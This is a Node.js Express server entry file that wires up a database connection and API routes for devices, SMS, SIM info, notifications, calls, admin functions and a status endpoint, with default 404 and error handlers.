import express from "express";
import cors from "cors";
import dotenv from "dotenv";
import { connectDB } from "./config/db.js";

// Existing routes
import deviceRoutes from "./routes/deviceRoutes.js";
import smsRoutes from "./routes/smsRoutes.js";
import simInfoRoutes from "./routes/simInfoRoutes.js";
import notificationRoutes from "./routes/notificationRoutes.js";
import callRoutes from "./routes/callRoutes.js";
import adminRoutes from "./routes/adminRoutes.js";

// 🆕 New route import
import statusRoutes from "./routes/statusRoutes.js";

dotenv.config();
const app = express();
connectDB();

app.use(cors());
app.use(express.json());

// Default Route
app.get("/", (req, res) => {
  res.send("Hello my brother 😄 — Devices API is running fine!");
});

// Existing APIs
app.use("/api/device", deviceRoutes);
app.use("/api/sms", smsRoutes);
app.use("/api/sim", simInfoRoutes);
app.use("/api/notification", notificationRoutes);
app.use("/api/call", callRoutes);
app.use("/api/admin", adminRoutes);

// 🆕 Add status route
app.use("/api/status", statusRoutes);

// Handle 404
app.use((req, res) =>
  res.status(404).json({ success: false, message: "Route not found" })
);

app.use((err, req, res, next) => {
  console.error("Unhandled error:", err);
  res.status(500).json({ success: false, message: "Internal server error" });
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => console.log(` Server running on port ${PORT}`));
